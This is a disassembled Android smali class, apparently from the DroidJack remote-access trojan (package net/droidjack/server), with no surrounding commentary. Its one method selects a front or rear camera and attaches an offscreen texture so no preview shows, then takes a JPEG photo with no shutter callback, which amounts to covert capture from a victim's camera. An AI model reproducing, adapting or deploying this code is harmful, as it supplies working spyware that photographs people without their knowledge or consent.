.class Lnet/droidjack/server/j;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/util/concurrent/Callable;


# instance fields
.field final synthetic a:Lnet/droidjack/server/i;

.field private final synthetic b:Landroid/hardware/Camera$PictureCallback;


# direct methods
.method constructor <init>(Lnet/droidjack/server/i;Landroid/hardware/Camera$PictureCallback;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/j;->a:Lnet/droidjack/server/i;

    iput-object p2, p0, Lnet/droidjack/server/j;->b:Landroid/hardware/Camera$PictureCallback;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a()Ljava/lang/Void;
    .locals 9

    const/4 v8, 0x0

    const/4 v7, 0x1

    const/4 v1, 0x0

    iget-object v0, p0, Lnet/droidjack/server/j;->a:Lnet/droidjack/server/i;

    invoke-static {v0}, Lnet/droidjack/server/i;->a(Lnet/droidjack/server/i;)Lnet/droidjack/server/CamSnapDJ;

    move-result-object v0

    invoke-static {v0}, Lnet/droidjack/server/CamSnapDJ;->c(Lnet/droidjack/server/CamSnapDJ;)I

    move-result v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    new-instance v2, Landroid/hardware/Camera$CameraInfo;

    invoke-direct {v2}, Landroid/hardware/Camera$CameraInfo;-><init>()V

    invoke-static {}, Landroid/hardware/Camera;->getNumberOfCameras()I

    move-result v4

    move v0, v1

    :goto_0
    if-lt v0, v4, :cond_3

    iget-object v0, p0, Lnet/droidjack/server/j;->a:Lnet/droidjack/server/i;

    invoke-static {v0}, Lnet/droidjack/server/i;->a(Lnet/droidjack/server/i;)Lnet/droidjack/server/CamSnapDJ;

    move-result-object v0

    invoke-static {v0}, Lnet/droidjack/server/CamSnapDJ;->d(Lnet/droidjack/server/CamSnapDJ;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lnet/droidjack/server/j;->a:Lnet/droidjack/server/i;

    invoke-static {v0}, Lnet/droidjack/server/i;->a(Lnet/droidjack/server/i;)Lnet/droidjack/server/CamSnapDJ;

    move-result-object v0

    invoke-static {v0}, Lnet/droidjack/server/CamSnapDJ;->a(Lnet/droidjack/server/CamSnapDJ;)Landroid/hardware/Camera;

    move-result-object v0

    invoke-virtual {v0}, Landroid/hardware/Camera;->stopPreview()V

    :cond_0
    iget-object v0, p0, Lnet/droidjack/server/j;->a:Lnet/droidjack/server/i;

    invoke-static {v0}, Lnet/droidjack/server/i;->a(Lnet/droidjack/server/i;)Lnet/droidjack/server/CamSnapDJ;

    move-result-object v0

    invoke-static {v0}, Lnet/droidjack/server/CamSnapDJ;->a(Lnet/droidjack/server/CamSnapDJ;)Landroid/hardware/Camera;

    move-result-object v0

    invoke-virtual {v0}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v4

    invoke-virtual {v4}, Landroid/hardware/Camera$Parameters;->getSupportedPreviewSizes()Ljava/util/List;

    move-result-object v5

    invoke-interface {v5, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/hardware/Camera$Size;

    move-object v2, v0

    :goto_1
    invoke-interface {v5}, Ljava/util/List;->size()I

    move-result v0

    if-lt v1, v0, :cond_6

    const/16 v0, 0x100

    :try_start_0
    invoke-virtual {v4, v0}, Landroid/hardware/Camera$Parameters;->setPictureFormat(I)V

    const/16 v0, 0x64

    invoke-virtual {v4, v0}, Landroid/hardware/Camera$Parameters;->setJpegQuality(I)V

    iget v0, v2, Landroid/hardware/Camera$Size;->width:I

    iget v1, v2, Landroid/hardware/Camera$Size;->height:I

    invoke-virtual {v4, v0, v1}, Landroid/hardware/Camera$Parameters;->setPreviewSize(II)V

    const-string v0, "0"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_1

    const/16 v0, 0x5a

    invoke-virtual {v4, v0}, Landroid/hardware/Camera$Parameters;->setRotation(I)V

    :cond_1
    const-string v0, "1"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_2

    const/16 v0, 0x10e

    invoke-virtual {v4, v0}, Landroid/hardware/Camera$Parameters;->setRotation(I)V

    :cond_2
    iget-object v0, p0, Lnet/droidjack/server/j;->a:Lnet/droidjack/server/i;

    invoke-static {v0}, Lnet/droidjack/server/i;->a(Lnet/droidjack/server/i;)Lnet/droidjack/server/CamSnapDJ;

    move-result-object v0

    invoke-static {v0}, Lnet/droidjack/server/CamSnapDJ;->a(Lnet/droidjack/server/CamSnapDJ;)Landroid/hardware/Camera;

    move-result-object v0

    invoke-virtual {v0, v4}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_2
    :try_start_1
    iget-object v0, p0, Lnet/droidjack/server/j;->a:Lnet/droidjack/server/i;

    invoke-static {v0}, Lnet/droidjack/server/i;->a(Lnet/droidjack/server/i;)Lnet/droidjack/server/CamSnapDJ;

    move-result-object v0

    invoke-static {v0}, Lnet/droidjack/server/CamSnapDJ;->a(Lnet/droidjack/server/CamSnapDJ;)Landroid/hardware/Camera;

    move-result-object v0

    new-instance v1, Landroid/graphics/SurfaceTexture;

    const/4 v2, 0x1

    invoke-direct {v1, v2}, Landroid/graphics/SurfaceTexture;-><init>(I)V

    invoke-virtual {v0, v1}, Landroid/hardware/Camera;->setPreviewTexture(Landroid/graphics/SurfaceTexture;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :goto_3
    iget-object v0, p0, Lnet/droidjack/server/j;->a:Lnet/droidjack/server/i;

    invoke-static {v0}, Lnet/droidjack/server/i;->a(Lnet/droidjack/server/i;)Lnet/droidjack/server/CamSnapDJ;

    move-result-object v0

    invoke-static {v0}, Lnet/droidjack/server/CamSnapDJ;->a(Lnet/droidjack/server/CamSnapDJ;)Landroid/hardware/Camera;

    move-result-object v0

    invoke-virtual {v0}, Landroid/hardware/Camera;->startPreview()V

    iget-object v0, p0, Lnet/droidjack/server/j;->a:Lnet/droidjack/server/i;

    invoke-static {v0}, Lnet/droidjack/server/i;->a(Lnet/droidjack/server/i;)Lnet/droidjack/server/CamSnapDJ;

    move-result-object v0

    invoke-static {v0, v7}, Lnet/droidjack/server/CamSnapDJ;->a(Lnet/droidjack/server/CamSnapDJ;Z)V

    iget-object v0, p0, Lnet/droidjack/server/j;->a:Lnet/droidjack/server/i;

    invoke-static {v0}, Lnet/droidjack/server/i;->a(Lnet/droidjack/server/i;)Lnet/droidjack/server/CamSnapDJ;

    move-result-object v0

    invoke-static {v0}, Lnet/droidjack/server/CamSnapDJ;->a(Lnet/droidjack/server/CamSnapDJ;)Landroid/hardware/Camera;

    move-result-object v0

    iget-object v1, p0, Lnet/droidjack/server/j;->b:Landroid/hardware/Camera$PictureCallback;

    iget-object v2, p0, Lnet/droidjack/server/j;->b:Landroid/hardware/Camera$PictureCallback;

    invoke-virtual {v0, v8, v1, v2}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    return-object v8

    :cond_3
    invoke-static {v0, v2}, Landroid/hardware/Camera;->getCameraInfo(ILandroid/hardware/Camera$CameraInfo;)V

    iget v5, v2, Landroid/hardware/Camera$CameraInfo;->facing:I

    if-nez v5, :cond_4

    const-string v5, "0"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_4

    :try_start_2
    iget-object v5, p0, Lnet/droidjack/server/j;->a:Lnet/droidjack/server/i;

    invoke-static {v5}, Lnet/droidjack/server/i;->a(Lnet/droidjack/server/i;)Lnet/droidjack/server/CamSnapDJ;

    move-result-object v5

    invoke-static {v0}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v6

    invoke-static {v5, v6}, Lnet/droidjack/server/CamSnapDJ;->a(Lnet/droidjack/server/CamSnapDJ;Landroid/hardware/Camera;)V
    :try_end_2
    .catch Ljava/lang/RuntimeException; {:try_start_2 .. :try_end_2} :catch_3

    :cond_4
    :goto_4
    iget v5, v2, Landroid/hardware/Camera$CameraInfo;->facing:I

    if-ne v5, v7, :cond_5

    const-string v5, "1"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_5

    :try_start_3
    iget-object v5, p0, Lnet/droidjack/server/j;->a:Lnet/droidjack/server/i;

    invoke-static {v5}, Lnet/droidjack/server/i;->a(Lnet/droidjack/server/i;)Lnet/droidjack/server/CamSnapDJ;

    move-result-object v5

    invoke-static {v0}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v6

    invoke-static {v5, v6}, Lnet/droidjack/server/CamSnapDJ;->a(Lnet/droidjack/server/CamSnapDJ;Landroid/hardware/Camera;)V
    :try_end_3
    .catch Ljava/lang/RuntimeException; {:try_start_3 .. :try_end_3} :catch_2

    :cond_5
    :goto_5
    add-int/lit8 v0, v0, 0x1

    goto/16 :goto_0

    :cond_6
    invoke-interface {v5, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/hardware/Camera$Size;

    iget v0, v0, Landroid/hardware/Camera$Size;->width:I

    iget v6, v2, Landroid/hardware/Camera$Size;->width:I

    if-le v0, v6, :cond_7

    invoke-interface {v5, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/hardware/Camera$Size;

    move-object v2, v0

    :cond_7
    add-int/lit8 v0, v1, 0x1

    move v1, v0

    goto/16 :goto_1

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto/16 :goto_2

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto/16 :goto_3

    :catch_2
    move-exception v5

    goto :goto_5

    :catch_3
    move-exception v5

    goto :goto_4
.end method

.method public synthetic call()Ljava/lang/Object;
    .locals 1

    invoke-virtual {p0}, Lnet/droidjack/server/j;->a()Ljava/lang/Void;

    move-result-object v0

    return-object v0
.end method
